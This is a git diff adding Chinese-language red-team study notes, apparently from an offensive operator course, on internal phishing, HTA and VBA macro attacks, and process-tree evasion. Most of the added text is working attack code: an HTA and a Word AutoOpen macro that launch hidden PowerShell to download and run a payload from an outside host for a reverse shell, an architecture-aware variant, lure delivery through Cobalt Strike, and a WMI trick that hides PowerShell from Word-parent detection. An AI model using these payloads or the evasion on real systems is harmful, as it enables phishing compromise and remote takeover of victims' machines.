@@ -64,3 +64,116 @@ nglover@cyberbotic.io
 # 内部网络钓鱼
 
 > 访问一个或多个内部邮箱开辟了一些可能性。我们可以搜索可能包含文档、用户名和密码等敏感信息的电子邮件；甚至代表受感染用户向员工发送电子邮件。我们可以发送我们自己制作的文件和/或链接，或者甚至下载已经在收件箱中的文档，将其后门（例如使用宏），然后将其发回给某人
+
+
+# HTML Application (HTA)
+
+hta客户端攻击
+
+原理：在html中嵌入VBScript或者JScript代码，用户点击页面时触发代码执行
+
+下面这段代码双击以后在用户电脑中打开一个计算器
+```
+<html>
+  <head>
+    <title>Hello World</title>
+  </head>
+  <body>
+    <h2>Hello World</h2>
+    <p>This is an HTA...</p>
+  </body>
+
+  <script language="VBScript">
+    Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.run "calc"
+    End Function
+
+    Pwn
+  </script>
+</html>
+```
+
+
+只要把上面代码修改一行,就可以唤起powershell执行一个rev shell
+```
+shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"""
+```
+
+执行64位powershell，需指明路径
+```
+C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
+```
+
+注意上面```sysnative```是```System32```的别名
+
+
+下面代码判断目标机器的架构，从而决定启用哪个powershell(x86还是x64)
+```
+Function Pwn()
+  Set shell = CreateObject("wscript.Shell")
+
+  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
+    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
+  Else
+    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
+  End If
+
+End Function
+```
+
+# Visual Basic for Applications (VBA) Macro's
+
+宏攻击
+
+vba和vbscript差别不大，上面计算器的脚本稍微改一下就可以作为vba运行
+```
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "calc"
+
+End Sub
+```
+
+函数名为AutoOpen时是自动运行的意思
+
+同样的，也可以在vba中调用powershell，也需要注意架构问题，是32位还是64位。如果是64位，像上面一样指明路径。
+
+需要注意，文件扩展名必须是```.doc```。
+
+因为```.docx```文件无法保存宏代码。
+
+## HTA 网络钓鱼
+
+cobaltstrike
+
+Attacks > Web drive-by > Host File
+
+创建一个hta链接，发送给目标用户，诱使用户点击。
+
+
+## Word Doc 网络钓鱼
+
+把rev shell的vba放进doc文件，发送给用户，诱使用户打开。
+
+
+# Parent-Child Relationships
+
+父子进程
+
+一个父进程可以有很多子进程，但是一个子进程只能有一个父进程。
+
+观察进程关系，可以从防守角度察觉到攻击。
+
+一个winword.exe父进程下如果运行了powershell.exe子进程，那将是非常可疑的，很可能是执行了可疑程序。
+
+从进攻角度，打破这种关系可以使用 WMI Win32_Process 类来创建进程
+```
+Dim proc As Object
+Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+proc.Create "powershell"
+```
+
+在这种情况下，PowerShell 将是WmiPrvSE.exe而不是 MS Word 的子进程。
